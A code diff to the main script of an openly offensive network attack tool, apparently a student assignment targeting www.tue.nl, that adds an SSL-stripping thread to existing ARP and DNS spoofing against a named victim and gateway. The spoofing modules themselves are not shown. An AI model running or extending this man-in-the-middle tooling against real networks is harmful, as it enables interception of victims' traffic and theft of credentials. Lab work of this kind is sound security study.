@@ -6,13 +6,16 @@ import os
 
 import arp
 import dns
+import sslstrip
 
 def main():
-    parser = argparse.ArgumentParser(description="ARP and DNS Spoofing Tool. Victim and Gateway IPs required.")
+    parser = argparse.ArgumentParser(description="ARP, DNS Spoofing and SSL Stripping Tool. Victim and Gateway IPs required.")
     parser.add_argument("--victim", required=True, help="IP address of the victim machine")
     parser.add_argument("--gateway", required=True, help="IP address of the gateway")
     parser.add_argument("--attacker", required=True, help="IP address of the attacker machine (for DNS spoofing)")
     parser.add_argument("--target-domain", default="www.tue.nl", help="Domain to spoof (e.g., tue.nl)")
+    parser.add_argument("--sslstrip", action="store_true", help="Enable SSL stripping (monitors HTTP traffic)")
+    parser.add_argument("--interface", help="Network interface for SSL stripping")
     args = parser.parse_args()
 
 
@@ -39,8 +42,20 @@ def main():
         )
         arp_thread.start()
 
-        # Start DNS Spoofing in the main thread
-        dns.start_dns_spoof(args.target_domain, args.attacker)
+        # Start SSL Stripping if enabled
+        if args.sslstrip:
+            print(f"[+] Starting SSL Stripping in monitoring mode...")
+            sslstrip_thread = threading.Thread(
+                target=sslstrip.start_sslstrip_sniff,
+                args=(args.interface,),
+                daemon=True
+            )
+            sslstrip_thread.start()
+
+        # Keep running until interrupted
+        print("[+] Attack running. Press CTRL+C to stop.")
+        while True:
+            time.sleep(1)
 
     except KeyboardInterrupt:
         print("\n[+] Stopping ARP Spoofing. Restoring network...")
